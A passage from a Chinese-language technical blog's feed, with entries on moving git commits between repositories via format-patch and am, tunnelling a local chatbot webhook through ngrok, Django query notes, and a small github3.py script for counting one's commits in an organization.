&lt;p&gt;在我們要加入這些 commits 的 repo 使用這行指令把 commits 新增進來，以我的例子來說就是新 repo。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;要記住 xxx.patch 的路徑要是對的，因為上個指令產生的 xxx.patch 應該是不會在新 repo 的目錄底下才對 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果在 &lt;code&gt;git apply&lt;/code&gt; 的過程中遇到 trailing whitespace error 的話，可以參考這篇文章：&lt;a href="https://stackoverflow.com/questions/14509950/my-diff-contains-trailing-whitespace-how-to-get-rid-of-it"&gt;git - My diff contains trailing whitespace - how to get rid of it? - Stack Overflow&lt;/a&gt;，透過加入 &lt;code&gt;--whitespace=warn&lt;/code&gt; 或 &lt;code&gt;--whitespace=nowarn&lt;/code&gt; 參數來解決。  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;這樣是不是比上面那個步驟少多了？但這個方法有個缺點，就是使用 &lt;code&gt;git apply&lt;/code&gt; 的話，committer 會是使用 &lt;code&gt;git apply&lt;/code&gt; 的人，而不是原本的 committer，所以要介紹下面這個方法。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;"git format-patch + git am"&lt;/h3&gt;
&lt;p&gt;這個是 3 個方法裏面最推薦的，最後會講一下 GitHub 有一個小方法可以直接拿到 patch，可以直接給 &lt;code&gt;git am&lt;/code&gt; 使用。  &lt;/p&gt;
&lt;p&gt;基本上這方法應該是最正統的如何把別人的 commit 拿來給自己用的方式了，GitHub 也只是把這個包裝起來而已。如果是已經習慣透過 email 或者論壇收發 patch 的 Open Source contributer 兼 git 使用者，應該對這個方法習以為常。  &lt;/p&gt;
&lt;p&gt;一般的 GitHub user 應該都對這兩個指令不熟，因為 GitHub 已經把這塊都處理好了，所以使用者基本上不太需要自己操作。&lt;code&gt;man git-format-patch&lt;/code&gt; 和 &lt;code&gt;man git-am&lt;/code&gt; 就可以看到，這兩個指令基本上都是設計成在 email 的環境下使用：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;man git-format-patch&lt;/code&gt;: &lt;strong&gt;git-format-patch - Prepare patches for e-mail submission&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;man git-am&lt;/code&gt;: &lt;strong&gt;git-am - Apply a series of patches from a mailbox&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有興趣的人可以自己去看個詳細，這邊就不多談，直接講使用方法：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;git format-patch -k --stdout ${A_COMMIT_HASH}..${B_COMMIT_HASH} &amp;gt; xxx.patch&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在我們要抓 commmits 的 repo 下這行指令，以我的例子來說就是舊 repo。  &lt;/li&gt;
&lt;li&gt;A commit 要比 B commit 早，不然 output 會是空的。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;-k&lt;/code&gt;, &lt;code&gt;--keep-subject&lt;/code&gt;: Do not strip/add [PATCH] from the first line of the commit log message.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;加入 &lt;code&gt;-k&lt;/code&gt; 這個參數的話， commit log 的第一行就不會加上 &lt;code&gt;[PATCH]&lt;/code&gt;。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git am -k -3 &amp;lt; xxx.patch&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在我們要加入這些 commits 的 repo 使用這行指令，以我的例子來說就是新 repo。  &lt;ul&gt;
&lt;li&gt;要記住 xxx.patch 的路徑要是對的，因為上個指令產生的 xxx.patch 應該是不會在新 repo 的家目錄底下才對 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-k&lt;/code&gt; 是為了接收加了 &lt;code&gt;-k&lt;/code&gt; 參數沒有加了 &lt;code&gt;[PATCH]&lt;/code&gt; 字串的 patch 檔  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-3&lt;/code&gt; 是使用 three-way merge  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其實跟 &lt;code&gt;git diff&lt;/code&gt; + &lt;code&gt;git apply&lt;/code&gt; 非常像。  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://stackoverflow.com/a/9507417"&gt;在 StackOverflow 上的這個回答&lt;/a&gt; 直接教你怎麼把這兩個指令合在 1 行解決。  &lt;/p&gt;
&lt;h4&gt;GitHub 支援 &lt;code&gt;git format-patch&lt;/code&gt; 的小功能&lt;/h4&gt;
&lt;p&gt;GitHub 其實可以在 commit, pull request, compare 的網址後面加上 &lt;code&gt;.patch&lt;/code&gt;，就會拿到 &lt;code&gt;git format-patch&lt;/code&gt; 產生的檔案，不過這邊的 output 是沒有加 &lt;code&gt;-k&lt;/code&gt; 參數的，所以會有 "[PATCH]" 字串，以下是範例：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;commit: &lt;a href="https://github.com/zdict/zdict/commit/b871cd6c8a6a71f595fe93132cc9d5c9a71eb82d.patch"&gt;https://github.com/zdict/zdict/commit/b871cd6c8a6a71f595fe93132cc9d5c9a71eb82d.patch&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;pull request: &lt;a href="https://patch-diff.githubusercontent.com/raw/zdict/zdict/pull/149.patch"&gt;https://patch-diff.githubusercontent.com/raw/zdict/zdict/pull/149.patch&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;compare: &lt;a href="https://github.com/zdict/zdict/compare/issue-23.patch"&gt;https://github.com/zdict/zdict/compare/issue-23.patch&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;參考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/5120038/is-it-possible-to-cherry-pick-a-commit-from-another-git-repository/9507417#9507417"&gt;Is it possible to cherry-pick a commit from another git repository? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這邊有列出一些可以做到的方法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/12320863/how-do-you-take-a-git-diff-file-and-apply-it-to-a-local-branch-that-is-a-copy-o/12320940#12320940"&gt;How do you take a git diff file, and apply it to a local branch that is a copy of the same repository? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇解釋了為什麼 "&lt;code&gt;git format-patch&lt;/code&gt; + &lt;code&gt;git am&lt;/code&gt;" 比 "&lt;code&gt;git diff&lt;/code&gt; + &lt;code&gt;git apply&lt;/code&gt;" 好  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;A better way to exchange whole commits by file is the combination of the commands git format-patch on the sender and then git am on the receiver, because it also transfers the authorship info and the commit message.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://coderwall.com/p/sgpksw/git-cherry-pick-from-another-repository"&gt;Git cherry-pick from another repository (Example)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/14509950/my-diff-contains-trailing-whitespace-how-to-get-rid-of-it"&gt;git - My diff contains trailing whitespace - how to get rid of it? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="git"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>利用 ngrok 直接在本機開發 chatbot</title><link href="https://blog.m157q.tw/posts/2017/12/29/ngrok-https-proxy-to-write-chatbot-in-localhost/" rel="alternate"></link><published>2017-12-31T15:54:20+08:00</published><updated>2017-12-31T15:54:20+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-29:posts/2017/12/29/ngrok-https-proxy-to-write-chatbot-in-localhost/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;去年第 4 季部份時間，加上今年上半年大部份時間，幾乎都在做 chatbot 相關的開發。剛開始的時候真的是感到相關開發的工具是很不齊全（當然經過了一年多的發展，現在有更多更方便開發 chatbot 的工具了。），尤其是臺灣最多人用的 Facebook 和 Line 真的是對開發者挺不友善的。主要都是 API 的限制比較多，但 Line 至少還有個官方的 SDK，Facebook Messenger Bot 則連個官方的 SDK 都沒有，基本上都是第三方的，絕大多數都是開發者自己包的。  &lt;/p&gt;
&lt;p&gt;好像有點離題了，總之，一開始開發 Facebook Messenger Bot 的時候，都是在 Webhook 網址填入 Google App Engine service 給的預設網址，每次有改動就要 deploy 上去 GAE，等新版本的 service 正常運作之後，還要再等 Facebook 一段時間才會真的切換到新版本，時間不太一定。一開始還可以接受，但後來就覺得這樣實在是太麻煩了，所以就開始尋找有沒有比較方便的解法。  &lt;/p&gt;
&lt;p&gt;一開始是往「有沒有辦法在本機架一個模擬 Messenger Bot 介面的網頁前端出來」去找，還真的有人寫：&lt;a href="https://github.com/spchuang/fb-local-chat-bot"&gt;https://github.com/spchuang/fb-local-chat-bot&lt;/a&gt;，但因為是獨立開發，而且 Messenger Bot 的介面或 API 其實很常改動，所以我後來沒有採用這個方法。  &lt;/p&gt;
&lt;p&gt;後來詢問了一些人後，才往 web proxy 的方向找，有人推薦我使用免費的 &lt;a href="https://ngrok.com/"&gt;ngrok&lt;/a&gt;：可以拿到一個支援 https 的 web proxy，在 Facebook Messenger Bot 使用的 Webhook 網址填入 ngrok 的 https 網址，之後 Facebook 送到該網址的 request 都會由 ngrok 轉送到本機的某一個 port 上，只要你有在 localhost 把 Messenger Bot 的 Webhook server 執行起來的話，就可以很方便得用自己的手機開啟 chatbot 來邊操作邊即時修改程式碼。  &lt;/p&gt;
&lt;p&gt;作法其實滿簡單的，用了以後開發速度真的加快不少，也可以很即時跟跟 PM 那邊去做確認，確認沒問題了以後再 deploy。而且無論任何語言寫的 chatbot 都可以使用這方法，以下做個介紹。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;介紹&lt;/h2&gt;
&lt;p&gt;官方網站：&lt;a href="https://ngrok.com/"&gt;https://ngrok.com/&lt;/a&gt; 有安裝方式，安裝好後也只要一行指令就可以使用了，我自己是這樣用：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;ngrok http 8080&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;這樣就會拿到一個接到 local host 8080 port 的 HTTP/HTTPS proxy，至於要用哪個 port 可以自己選擇，不一定要用 8080。  &lt;/p&gt;
&lt;p&gt;執行後，Termianl 就會拿到像下面這樣的畫面：  &lt;/p&gt;
&lt;p&gt;&lt;img alt="ngrok cli" src="/files/ngrok-https-proxy-to-write-chatbot-in-localhost/ngrok-cli.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;也會在 local 開一個 web interface，連入以後的畫面像是這樣：  &lt;/p&gt;
&lt;p&gt;&lt;img alt="ngrok web admin 1" src="/files/ngrok-https-proxy-to-write-chatbot-in-localhost/ngrok-web-admin-1.jpg" /&gt;&lt;br /&gt;
&lt;img alt="ngrok web admin 2" src="/files/ngrok-https-proxy-to-write-chatbot-in-localhost/ngrok-web-admin-2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;接下來只要把拿到的 https proxy 的 url 填入 chatbot 的 webhook url，然後在 local 把自己開發的 chatbot webhook server 開在接入的 port 就行了。  &lt;/p&gt;
&lt;p&gt;如果是 Google App Engine 的 dev_appserver.py 的話，預設就會開在 8080 port。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://ngrok.com/"&gt;ngrok - secure introspectable tunnels to localhost&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/inconshreveable/ngrok"&gt;GitHub - inconshreveable/ngrok: Introspected tunnels to localhost&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="ngrok"></category><category term="chatbot"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>關於 Django 的 F() expressions, Q object, Aggregation 的一些筆記</title><link href="https://blog.m157q.tw/posts/2017/12/28/about-django-f-expression-q-object-and-aggregation/" rel="alternate"></link><published>2017-12-28T23:15:00+08:00</published><updated>2017-12-28T23:15:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-28:posts/2017/12/28/about-django-f-expression-q-object-and-aggregation/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;這篇算是在清草稿，約莫一年前紀錄在自己使用的 Trello board 的其中一張 card 裏面。  &lt;/p&gt;
&lt;p&gt;當時接手維護已離職的前同事的專案，是當時將員工內部使用的後台前後分離出來的網頁後端伺服器。他透過使用 Django 的 F() expressions, Q object, Aggregation 創造了一個 base view class（命名為 &lt;code&gt;ModelView&lt;/code&gt;），讓所有繼承這個 base class 的 view 都可以有類似 GraphQL 的效果，可以接收帶有符合 Django Query 參數的 json request 後，直接透過 model 去拿資料，再把資料包成 json response 吐回去。  &lt;/p&gt;
&lt;p&gt;這讓新增新的 API 變得很簡單，只要以下幾個步驟：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定義好新的 model  &lt;/li&gt;
&lt;li&gt;寫一個新的 View 繼承自 &lt;code&gt;ModelView&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;第一行宣告繼承，第二行寫說對應到哪個 model 就行了  &lt;/li&gt;
&lt;li&gt;只要兩行，所有的 CRUD 以及 response 都會自動處理好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;urls.py&lt;/code&gt; 裡頭新增對應到該 View 的網址  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;真的是用了滿多黑魔法的，我們在開發的時候都開玩笑得說：「這算是『魔改 Django』了吧？」但因為程式碼是放在 private repo，所以以下就只紀錄當時我去 trace source code 時紀錄的一些筆記。  &lt;/p&gt;
&lt;p&gt;最讓我覺得厲害的地方是，前同事 Jay 寫出這個東西之前根本沒碰過 Django，雖然其中也有問我一些問題，但他大概只花 3 個月就寫出這東西，後來我去看他寫的程式碼發現許多地方我看不懂，讓我挺佩服的。有點可惜這裡不能拿程式碼來一一講解就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;&lt;a href="https://docs.djangoproject.com/en/1.10/ref/models/expressions/#f-expressions"&gt;&lt;code&gt;F()&lt;/code&gt; expressions&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;An &lt;code&gt;F()&lt;/code&gt; object represents the value of a model field or annotated column. It makes it possible to refer to model field values and perform database operations using them without actually having to pull them out of the database into Python memory.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;不會真的從 db 拿出值，可以減少 db query，讓效能好一點。  &lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;F()&lt;/code&gt; 以後，要真的更新值的話，必須要使用 &lt;code&gt;refresh_from_db()&lt;/code&gt;，&lt;code&gt;save()&lt;/code&gt; 只會先紀錄而已，並不會真的寫入。  &lt;/li&gt;
&lt;li&gt;可以避免 race condition 的問題，因為每個人不用拿到現在的值以後才去做更改，只要每個動作都有 &lt;code&gt;save()&lt;/code&gt; 的話，最後再一次 &lt;code&gt;refresh_from_db()&lt;/code&gt; 就好。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;F()&lt;/code&gt; assignments persist after &lt;code&gt;Model.save()&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;如果 &lt;code&gt;save()&lt;/code&gt; 兩次的話，就會作用兩次。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;&lt;a href="https://docs.djangoproject.com/en/1.10/topics/db/queries/#complex-lookups-with-q"&gt;Q object&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Django &lt;code&gt;QuerySet&lt;/code&gt; 的 &lt;code&gt;filter()&lt;/code&gt; 基本上只能處理 AND 的 Query，如果想要使用 OR 或者更複雜一點的 Query 的話，就必須要使用 &lt;code&gt;Q()&lt;/code&gt;。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;&lt;a href="https://docs.djangoproject.com/en/1.10/topics/db/aggregation/"&gt;Aggregation&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;QuerySet.annotate()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;回傳一個 &lt;code&gt;QuerySet&lt;/code&gt;，可以給 &lt;code&gt;admin.ModelAdmin&lt;/code&gt; 使用。  &lt;/li&gt;
&lt;li&gt;基本上等同於 SQL 語句的 &lt;code&gt;AS&lt;/code&gt;。  &lt;/li&gt;
&lt;li&gt;可搭配 &lt;code&gt;values()&lt;/code&gt;, &lt;code&gt;order_by()&lt;/code&gt; 做到 SQL 語句的 &lt;code&gt;GROUP BY&lt;/code&gt;。  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;values()&lt;/code&gt; 和 &lt;code&gt;annotate()&lt;/code&gt; 的前後順序生出來的 Query 語句是有差別的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;QuerySet.aggregate()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;回傳一個 dictionary，基本上就是拿來統計數字用而已。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;print(QuerySet.query)&lt;/code&gt; 來察看 QuerySet 生成的 SQL query statement.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;後記&lt;/h2&gt;
&lt;p&gt;讓我有點不勝唏噓的是，筆記內容的連結依然是 Django 1.10，一年半前是最新的版本，但現在點進去已經顯示 &lt;strong&gt;"This document is for an insecure version of Django that is no longer supported. Please upgrade to a newer release!"&lt;/strong&gt; 了。  &lt;/p&gt;</summary><category term="Python"></category><category term="Django"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>用 Python 抓出我在前公司貢獻了多少 GitHub commits</title><link href="https://blog.m157q.tw/posts/2017/12/27/fetch-my-github-commits-in-one-organization-with-python-script/" rel="alternate"></link><published>2018-01-13T20:45:13+08:00</published><updated>2018-01-13T20:45:13+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-27:posts/2017/12/27/fetch-my-github-commits-in-one-organization-with-python-script/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;主要是因為&lt;a href="/posts/2017/12/26/i-left-my-first-full-time-job/"&gt;上一篇文章撰寫了離職心得&lt;/a&gt;，在寫的過程中想到，好像可以用 GitHub API 抓一下我在前公司這將近兩年的日子到底送了多少 commits。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;正文&lt;/h2&gt;
&lt;p&gt;廢話不多說，直接進程式碼。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 Python 3  &lt;/li&gt;
&lt;li&gt;要用到 &lt;a href="https://github.com/sigmavirus24/github3.py"&gt;github3.py&lt;/a&gt; 這個 package  &lt;ul&gt;
&lt;li&gt;請使用 &lt;code&gt;pip install --pre github3.py&lt;/code&gt; 來安裝  &lt;/li&gt;
&lt;li&gt;使用的版本為 &lt;code&gt;github3.py (1.0.0a4)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;雖然可以直接用帳號密碼登入，但因為我有用 2FA，所以直接產生一組 Access Token 比較方便，也比較安全。  &lt;ul&gt;
&lt;li&gt;可以到 &lt;a href="https://github.com/settings/tokens"&gt;https://github.com/settings/tokens&lt;/a&gt; 產生一組，只需要勾選最基本的 repo 權限就行了，詳細可以參考 &lt;a href="https://help.github.com/articles/creating-a-personal-access-token-for-the-command-line/"&gt;GitHub 的官方教學&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這個 script 可以拿來算你在某個 organization 的總 commits 數，總共 35 行就搞定了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3  &lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pprint&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;pprint&lt;/span&gt;  

&lt;span class="c1"&gt;# Make sure you&amp;#39;ve installed github3.py via `pip install --pre github3.py`  &lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;github3&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;  


&lt;span class="n"&gt;MY_GITHUB_USERNAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="c1"&gt;# Visit https://github.com/settings/tokens to create a token if you don&amp;#39;t have.  &lt;/span&gt;
&lt;span class="c1"&gt;# Check &amp;quot;repo&amp;quot; permission  &lt;/span&gt;
&lt;span class="n"&gt;MY_GITHUB_TOKEN&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;TARGET_ORGNIZATION_NAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  

&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;MY_GITHUB_TOKEN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;org&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;organization&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TARGET_ORGNIZATION_NAME&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;my_stats&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;repositories&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;  
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;contribution&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;contributor_statistics&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;  
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;MY_GITHUB_USERNAME&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;repr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;contribution&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;author&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;contribution&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
            &lt;span class="n"&gt;my_stats&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;contribution&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GitHub username: {}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MY_GITHUB_USERNAME&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Target GitHub organization: {}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TARGET_ORGNIZATION_NAME&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Total contributed repos: {}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;my_stats&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Total commits: {}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;commits&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;commits&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;my_stats&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;  

&lt;span class="n"&gt;my_stats_desc_sorted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;my_stats&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Repo and commits:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
